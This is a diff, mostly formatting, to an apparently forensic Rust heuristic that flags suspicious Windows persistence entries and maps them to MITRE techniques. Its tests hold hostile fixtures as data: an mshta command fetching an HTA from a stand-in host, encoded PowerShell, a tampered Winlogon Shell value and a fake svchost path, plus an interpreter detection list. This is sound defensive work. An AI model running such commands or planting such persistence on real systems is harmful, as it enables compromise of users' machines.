@@ -40,8 +40,18 @@ fn escalate(sev: Severity) -> Severity {
 /// command's first token) — a substring match would flag "PowerShell Studio\app.exe".
 fn script_persistence_signal(p: &PersistenceRecord) -> Option<GateHit> {
     const INTERPRETERS: &[&str] = &[
-        "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe", "cmd.exe",
-        "powershell", "pwsh", "wscript", "cscript", "mshta", "cmd",
+        "powershell.exe",
+        "pwsh.exe",
+        "wscript.exe",
+        "cscript.exe",
+        "mshta.exe",
+        "cmd.exe",
+        "powershell",
+        "pwsh",
+        "wscript",
+        "cscript",
+        "mshta",
+        "cmd",
     ];
     let cmd = p.command.as_deref()?;
     let invoked = p
@@ -49,9 +59,11 @@ fn script_persistence_signal(p: &PersistenceRecord) -> Option<GateHit> {
         .as_deref()
         .map(|bp| short_name_persist(bp).to_ascii_lowercase())
         .or_else(|| {
-            cmd.trim().trim_matches('"').split_whitespace().next().map(|t| {
-                short_name_persist(t).to_ascii_lowercase()
-            })
+            cmd.trim()
+                .trim_matches('"')
+                .split_whitespace()
+                .next()
+                .map(|t| short_name_persist(t).to_ascii_lowercase())
         })?;
     if !INTERPRETERS.contains(&invoked.as_str()) {
         return None;
@@ -65,7 +77,9 @@ fn script_persistence_signal(p: &PersistenceRecord) -> Option<GateHit> {
         return Some(GateHit {
             severity: Severity::High,
             label: "腳本直譯器持久化（編碼/遠端內容）",
-            reason: format!("persistence command runs {invoked} with encoded or remote content: {cmd}"),
+            reason: format!(
+                "persistence command runs {invoked} with encoded or remote content: {cmd}"
+            ),
             mitre: "T1059",
         });
     }
@@ -112,12 +126,20 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
     if p.mechanism == "ifeo" {
         let untrusted = p.signed == Some(false) || is_user_writable_path(path);
         hits.push(GateHit {
-            severity: if untrusted { Severity::High } else { Severity::Medium },
+            severity: if untrusted {
+                Severity::High
+            } else {
+                Severity::Medium
+            },
             label: "IFEO debugger 挾持",
             reason: format!(
                 "IFEO Debugger set ({}); target {}",
                 p.location,
-                if untrusted { "unsigned or in a user-writable path" } else { "signed, system/vendor path (Process Explorer-style use)" }
+                if untrusted {
+                    "unsigned or in a user-writable path"
+                } else {
+                    "signed, system/vendor path (Process Explorer-style use)"
+                }
             ),
             mitre: "T1546.012",
         });
@@ -136,7 +158,9 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
         hits.push(GateHit {
             severity: Severity::High,
             label: "未簽章執行檔於使用者可寫路徑",
-            reason: format!("binary is explicitly unsigned and lives in a user-writable drop zone: {path}"),
+            reason: format!(
+                "binary is explicitly unsigned and lives in a user-writable drop zone: {path}"
+            ),
             mitre: "T1036",
         });
     }
@@ -153,7 +177,11 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
 
     // S4: recent + unverifiable + outside system/vendor dirs — all three required.
     // Recency ALONE is dead (update-day mass rewrites, per-user service instances).
-    if path_signals_apply && p.signed.is_none() && !path.is_empty() && !is_system_or_program_files(path) {
+    if path_signals_apply
+        && p.signed.is_none()
+        && !path.is_empty()
+        && !is_system_or_program_files(path)
+    {
         if let Some(lw) = p.last_write {
             let age = now.signed_duration_since(lw);
             if age >= Duration::zero() && age <= Duration::days(RECENT_DAYS) {
@@ -283,7 +311,9 @@ fn execution_evidence(entries: &[&ExecutionRecord]) -> Vec<EvidenceItem> {
             let mut detail = format!(
                 "{}: run_count={} last_run={}",
                 e.source,
-                e.run_count.map(|c| c.to_string()).unwrap_or_else(|| "?".into()),
+                e.run_count
+                    .map(|c| c.to_string())
+                    .unwrap_or_else(|| "?".into()),
                 e.last_run
                     .map(|t| t.format("%Y-%m-%dT%H:%M:%SZ").to_string())
                     .unwrap_or_else(|| "unknown".into()),
@@ -354,7 +384,10 @@ impl Analyzer for PersistHeuristic {
             }
 
             let key = normalized_basename(
-                p.binary_path.as_deref().or(p.command.as_deref()).unwrap_or(""),
+                p.binary_path
+                    .as_deref()
+                    .or(p.command.as_deref())
+                    .unwrap_or(""),
             );
             let mut evidence = vec![persistence_evidence(p)];
             let exec_hits = idx.exec.get(&key).map(Vec::as_slice).unwrap_or(&[]);
@@ -383,9 +416,16 @@ impl Analyzer for PersistHeuristic {
                 .max_by_key(|h| sev_rank(h.severity))
                 .unwrap_or(&hits[0]);
             let short = short_name_persist(
-                p.binary_path.as_deref().or(p.command.as_deref()).unwrap_or(&p.location),
+                p.binary_path
+                    .as_deref()
+                    .or(p.command.as_deref())
+                    .unwrap_or(&p.location),
             );
-            let mut f = Finding::new(sev, format!("{}: {short}", top.label), FindingSource::Heuristic);
+            let mut f = Finding::new(
+                sev,
+                format!("{}: {short}", top.label),
+                FindingSource::Heuristic,
+            );
             f.reason = Some(reasons.join("; "));
             f.mitre = {
                 let mut m: Vec<String> = hits.iter().map(|h| h.mitre.to_string()).collect();
@@ -416,7 +456,10 @@ impl Analyzer for PersistHeuristic {
                 p.mechanism.clone()
             };
             let short = short_name_persist(
-                p.binary_path.as_deref().or(p.command.as_deref()).unwrap_or(&p.location),
+                p.binary_path
+                    .as_deref()
+                    .or(p.command.as_deref())
+                    .unwrap_or(&p.location),
             );
             let mut o = Observation::new(category, format!("{}: {short}", p.mechanism));
             o.ts = p.last_write.unwrap_or(now);
@@ -576,44 +619,94 @@ mod tests {
     #[test]
     fn gate_s1a_winlogon_tamper_high_default_silent() {
         let now = Utc::now();
-        let tampered = full_rec("winlogon", Some("Shell"), Some("explorer.exe,evil.exe"),
-            None, None, None);
+        let tampered = full_rec(
+            "winlogon",
+            Some("Shell"),
+            Some("explorer.exe,evil.exe"),
+            None,
+            None,
+            None,
+        );
         let hits = evaluate_gate(&tampered, now);
         assert_eq!(hits.len(), 1);
         assert_eq!(hits[0].severity, Severity::High);
         assert_eq!(hits[0].mitre, "T1547.004");
-        let stock = full_rec("winlogon", Some("Shell"), Some("explorer.exe"),
-            Some(r"C:\Windows\explorer.exe"), Some(true), Some(now));
-        assert!(evaluate_gate(&stock, now).is_empty(), "stock winlogon must be inventory");
+        let stock = full_rec(
+            "winlogon",
+            Some("Shell"),
+            Some("explorer.exe"),
+            Some(r"C:\Windows\explorer.exe"),
+            Some(true),
+            Some(now),
+        );
+        assert!(
+            evaluate_gate(&stock, now).is_empty(),
+            "stock winlogon must be inventory"
+        );
     }
 
     #[test]
     fn gate_s1b_ifeo_severity_by_target_trust() {
         let now = Utc::now();
-        let evil = full_rec("ifeo", Some("Debugger"), Some(r"C:\Users\a\AppData\Roaming\d.exe"),
-            Some(r"C:\Users\a\AppData\Roaming\d.exe"), Some(false), None);
-        assert!(evaluate_gate(&evil, now).iter().any(|h| h.severity == Severity::High));
-        let procexp = full_rec("ifeo", Some("Debugger"), Some(r"C:\Program Files\SysInternals\procexp.exe"),
-            Some(r"C:\Program Files\SysInternals\procexp.exe"), Some(true), None);
+        let evil = full_rec(
+            "ifeo",
+            Some("Debugger"),
+            Some(r"C:\Users\a\AppData\Roaming\d.exe"),
+            Some(r"C:\Users\a\AppData\Roaming\d.exe"),
+            Some(false),
+            None,
+        );
+        assert!(evaluate_gate(&evil, now)
+            .iter()
+            .any(|h| h.severity == Severity::High));
+        let procexp = full_rec(
+            "ifeo",
+            Some("Debugger"),
+            Some(r"C:\Program Files\SysInternals\procexp.exe"),
+            Some(r"C:\Program Files\SysInternals\procexp.exe"),
+            Some(true),
+            None,
+        );
         let hits = evaluate_gate(&procexp, now);
         assert_eq!(hits.len(), 1, "IFEO always gates");
-        assert_eq!(hits[0].severity, Severity::Medium, "signed vendor target -> Medium");
+        assert_eq!(
+            hits[0].severity,
+            Severity::Medium,
+            "signed vendor target -> Medium"
+        );
     }
 
     #[test]
     fn gate_s2_unsigned_dropzone_high_but_signed_or_normal_path_silent() {
         let now = Utc::now();
-        let evil = full_rec("run_key", Some("Upd"), Some(r"C:\Users\a\AppData\Roaming\e.exe"),
-            Some(r"C:\Users\a\AppData\Roaming\e.exe"), Some(false), None);
+        let evil = full_rec(
+            "run_key",
+            Some("Upd"),
+            Some(r"C:\Users\a\AppData\Roaming\e.exe"),
+            Some(r"C:\Users\a\AppData\Roaming\e.exe"),
+            Some(false),
+            None,
+        );
         assert_eq!(evaluate_gate(&evil, now)[0].severity, Severity::High);
         // signed chrome autostart -> inventory
-        let chrome = full_rec("run_key", Some("Chrome"),
+        let chrome = full_rec(
+            "run_key",
+            Some("Chrome"),
             Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
-            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"), Some(true), Some(now));
+            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
+            Some(true),
+            Some(now),
+        );
         assert!(evaluate_gate(&chrome, now).is_empty());
         // unsigned but in Program Files (admin-write) -> not S2
-        let pf = full_rec("run_key", Some("V"), Some(r"C:\Program Files\V\v.exe"),
-            Some(r"C:\Program Files\V\v.exe"), Some(false), None);
+        let pf = full_rec(
+            "run_key",
+            Some("V"),
+            Some(r"C:\Program Files\V\v.exe"),
+            Some(r"C:\Program Files\V\v.exe"),
+            Some(false),
+            None,
+        );
         assert!(evaluate_gate(&pf, now).is_empty());
     }
 
@@ -641,11 +734,25 @@ mod tests {
     #[test]
     fn gate_s3_masquerade_absolute_only() {
         let now = Utc::now();
-        let fake = full_rec("service", None, Some(r"C:\ProgramData\svchost.exe"),
-            Some(r"C:\ProgramData\svchost.exe"), None, None);
-        assert!(evaluate_gate(&fake, now).iter().any(|h| h.mitre == "T1036.005"));
-        let bare = full_rec("winlogon", Some("Shell"), Some("explorer.exe"), Some("explorer.exe"),
-            None, None);
+        let fake = full_rec(
+            "service",
+            None,
+            Some(r"C:\ProgramData\svchost.exe"),
+            Some(r"C:\ProgramData\svchost.exe"),
+            None,
+            None,
+        );
+        assert!(evaluate_gate(&fake, now)
+            .iter()
+            .any(|h| h.mitre == "T1036.005"));
+        let bare = full_rec(
+            "winlogon",
+            Some("Shell"),
+            Some("explorer.exe"),
+            Some("explorer.exe"),
+            None,
+            None,
+        );
         // bare name: winlogon default -> no S1a; not absolute -> no S3
         assert!(evaluate_gate(&bare, now).is_empty());
     }
@@ -654,41 +761,87 @@ mod tests {
     fn gate_s4_needs_all_three_conditions() {
         let now = Utc::now();
         let recent = Some(now - Duration::days(2));
-        let hit = full_rec("service", None, Some(r"C:\Tools\agent.exe"),
-            Some(r"C:\Tools\agent.exe"), None, recent);
+        let hit = full_rec(
+            "service",
+            None,
+            Some(r"C:\Tools\agent.exe"),
+            Some(r"C:\Tools\agent.exe"),
+            None,
+            recent,
+        );
         assert_eq!(evaluate_gate(&hit, now)[0].severity, Severity::Medium);
         // signed -> no S4 (ASUS update-day services)
-        let signed = full_rec("service", None, Some(r"C:\Tools\agent.exe"),
-            Some(r"C:\Tools\agent.exe"), Some(true), recent);
+        let signed = full_rec(
+            "service",
+            None,
+            Some(r"C:\Tools\agent.exe"),
+            Some(r"C:\Tools\agent.exe"),
+            Some(true),
+            recent,
+        );
         assert!(evaluate_gate(&signed, now).is_empty());
         // system path -> no S4 (per-user svchost instances)
-        let sys = full_rec("service", None, Some(r"C:\Windows\System32\svchost.exe -k X"),
-            Some(r"C:\Windows\System32\svchost.exe"), None, recent);
+        let sys = full_rec(
+            "service",
+            None,
+            Some(r"C:\Windows\System32\svchost.exe -k X"),
+            Some(r"C:\Windows\System32\svchost.exe"),
+            None,
+            recent,
+        );
         assert!(evaluate_gate(&sys, now).is_empty());
         // old -> no S4
-        let old = full_rec("service", None, Some(r"C:\Tools\agent.exe"),
-            Some(r"C:\Tools\agent.exe"), None, Some(now - Duration::days(300)));
+        let old = full_rec(
+            "service",
+            None,
+            Some(r"C:\Tools\agent.exe"),
+            Some(r"C:\Tools\agent.exe"),
+            None,
+            Some(now - Duration::days(300)),
+        );
         assert!(evaluate_gate(&old, now).is_empty());
     }
 
     #[test]
     fn gate_s9_script_persistence_tiers() {
         let now = Utc::now();
-        let enc = full_rec("run_key", Some("U"),
-            Some("powershell.exe -NoP -Enc SQBFAFgA"), None, None, None);
+        let enc = full_rec(
+            "run_key",
+            Some("U"),
+            Some("powershell.exe -NoP -Enc SQBFAFgA"),
+            None,
+            None,
+            None,
+        );
         let h = evaluate_gate(&enc, now);
         assert_eq!(h[0].severity, Severity::High);
-        let remote = full_rec("run_key", Some("U"),
-            Some(r"mshta.exe https://evil.tld/x.hta"), None, None, None);
+        let remote = full_rec(
+            "run_key",
+            Some("U"),
+            Some(r"mshta.exe https://evil.tld/x.hta"),
+            None,
+            None,
+            None,
+        );
         assert_eq!(evaluate_gate(&remote, now)[0].severity, Severity::High);
-        let local = full_rec("scheduled_task", None,
-            Some(r"wscript.exe C:\Scripts\backup.vbs"), Some(r"C:\Windows\System32\wscript.exe"),
-            Some(true), None);
+        let local = full_rec(
+            "scheduled_task",
+            None,
+            Some(r"wscript.exe C:\Scripts\backup.vbs"),
+            Some(r"C:\Windows\System32\wscript.exe"),
+            Some(true),
+            None,
+        );
         assert_eq!(evaluate_gate(&local, now)[0].severity, Severity::Low);
         // interpreter-in-vendor-name must NOT fire (substring guard)
-        let studio = full_rec("run_key", Some("PS"),
+        let studio = full_rec(
+            "run_key",
+            Some("PS"),
             Some(r"C:\Program Files\PowerShell Studio\app.exe --serve"),
-            Some(r"C:\Program Files\PowerShell Studio\app.exe"), Some(true), None);
+            Some(r"C:\Program Files\PowerShell Studio\app.exe"),
+            Some(true),
+            None,
+        );
         assert!(evaluate_gate(&studio, now).is_empty());
     }
 
@@ -696,12 +849,24 @@ mod tests {
     fn gate_service_and_runkey_existence_is_inventory() {
         let now = Utc::now();
         // The 25-Low class from the 2026-06-28 run: plain third-party service.
-        let svc = full_rec("service", None, Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
-            Some(r"C:\Program Files\ASUS\AsusAppService.exe"), Some(true), Some(now - Duration::days(400)));
+        let svc = full_rec(
+            "service",
+            None,
+            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
+            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
+            Some(true),
+            Some(now - Duration::days(400)),
+        );
         assert!(evaluate_gate(&svc, now).is_empty());
         // The 13-Medium class: same service on update day (recent) — still inventory.
-        let svc_recent = full_rec("service", None, Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
-            Some(r"C:\Program Files\ASUS\AsusAppService.exe"), Some(true), Some(now - Duration::days(2)));
+        let svc_recent = full_rec(
+            "service",
+            None,
+            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
+            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
+            Some(true),
+            Some(now - Duration::days(2)),
+        );
         assert!(evaluate_gate(&svc_recent, now).is_empty());
     }
 
@@ -723,10 +888,22 @@ mod tests {
     fn analyze_emits_only_gated_and_observe_gets_the_rest() {
         let now = Utc::now();
         let records = vec![
-            wrap(full_rec("run_key", Some("Upd"), Some(r"C:\Users\a\AppData\Roaming\e.exe"),
-                Some(r"C:\Users\a\AppData\Roaming\e.exe"), Some(false), Some(now))),
-            wrap(full_rec("service", None, Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
-                Some(r"C:\Program Files\ASUS\AsusAppService.exe"), Some(true), Some(now))),
+            wrap(full_rec(
+                "run_key",
+                Some("Upd"),
+                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
+                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
+                Some(false),
+                Some(now),
+            )),
+            wrap(full_rec(
+                "service",
+                None,
+                Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
+                Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
+                Some(true),
+                Some(now),
+            )),
         ];
         let findings = PersistHeuristic.analyze(&records).unwrap();
         assert_eq!(findings.len(), 1, "only the S2 hit is a finding");
@@ -741,8 +918,14 @@ mod tests {
         use cairn_core::record::ExecutionRecord;
         let now = Utc::now();
         let records = vec![
-            wrap(full_rec("run_key", Some("U"), Some(r"C:\Users\a\AppData\Roaming\e.exe"),
-                Some(r"C:\Users\a\AppData\Roaming\e.exe"), Some(false), Some(now))),
+            wrap(full_rec(
+                "run_key",
+                Some("U"),
+                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
+                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
+                Some(false),
+                Some(now),
+            )),
             Record::Execution(ExecutionRecord {
                 source: "prefetch".into(),
                 path: "E.EXE".into(),
@@ -756,29 +939,55 @@ mod tests {
         ];
         let findings = PersistHeuristic.analyze(&records).unwrap();
         assert_eq!(findings.len(), 1);
-        assert_eq!(findings[0].severity, Severity::Critical, "S2 High + exec corroboration");
-        assert!(findings[0].evidence.iter().any(|e| e.artifact == "prefetch"));
+        assert_eq!(
+            findings[0].severity,
+            Severity::Critical,
+            "S2 High + exec corroboration"
+        );
+        assert!(findings[0]
+            .evidence
+            .iter()
+            .any(|e| e.artifact == "prefetch"));
         assert!(findings[0].evidence.iter().any(|e| e.artifact == "run_key"));
-        assert!(findings[0].reason.as_deref().unwrap().contains("corroborated"));
+        assert!(findings[0]
+            .reason
+            .as_deref()
+            .unwrap()
+            .contains("corroborated"));
     }
 
     #[test]
     fn details_starts_with_full_path_and_title_names_binary() {
         let now = Utc::now();
-        let records = vec![wrap(full_rec("run_key", Some("U"),
+        let records = vec![wrap(full_rec(
+            "run_key",
+            Some("U"),
             Some(r"C:\Users\a\AppData\Roaming\evil.exe"),
-            Some(r"C:\Users\a\AppData\Roaming\evil.exe"), Some(false), Some(now)))];
+            Some(r"C:\Users\a\AppData\Roaming\evil.exe"),
+            Some(false),
+            Some(now),
+        ))];
         let f = &PersistHeuristic.analyze(&records).unwrap()[0];
-        assert!(f.details.starts_with(r"C:\Users\a\AppData\Roaming\evil.exe |"),
-            "details must lead with the path: {}", f.details);
+        assert!(
+            f.details
+                .starts_with(r"C:\Users\a\AppData\Roaming\evil.exe |"),
+            "details must lead with the path: {}",
+            f.details
+        );
         assert!(f.title.contains("evil.exe"), "title: {}", f.title);
     }
 
     #[test]
     fn winlogon_default_is_observation_with_category() {
         let now = Utc::now();
-        let records = vec![wrap(full_rec("winlogon", Some("Shell"), Some("explorer.exe"),
-            Some(r"C:\Windows\explorer.exe"), Some(true), Some(now)))];
+        let records = vec![wrap(full_rec(
+            "winlogon",
+            Some("Shell"),
+            Some("explorer.exe"),
+            Some(r"C:\Windows\explorer.exe"),
+            Some(true),
+            Some(now),
+        ))];
         assert!(PersistHeuristic.analyze(&records).unwrap().is_empty());
         let obs = PersistHeuristic.observe(&records).unwrap();
         assert_eq!(obs[0].category, "winlogon_default");
